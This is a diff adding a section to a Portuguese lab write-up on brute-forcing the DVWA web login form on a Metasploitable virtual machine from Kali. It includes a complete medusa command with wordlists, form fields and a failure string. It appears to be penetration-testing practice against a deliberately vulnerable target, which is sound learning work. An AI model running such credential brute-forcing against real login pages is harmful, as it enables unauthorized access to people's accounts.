@@ -66,3 +66,17 @@ e digite o usuário e senha obtidos pelo medusa.
 
 Ataques de Força Bruta em Formulário web (DVWA):
 
+Abra o firefox no kali e digite o ip do metasploitable na barra de endereço:
+
+192.168.56.101/dvwa/login.php
+
+<img width="1919" height="829" alt="Captura de tela 2026-05-05 192846" src="https://github.com/user-attachments/assets/40544ecc-0928-4154-9452-60b4c8ab284a" />
+
+depois precisa ir ao terminal e começar o teste para isso será usado a lista anterior de usuário e senha. Depois digite o comando:
+
+medusa -h 192.168.56.101 -U user.txt -P pass.txt -M http \
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+
+
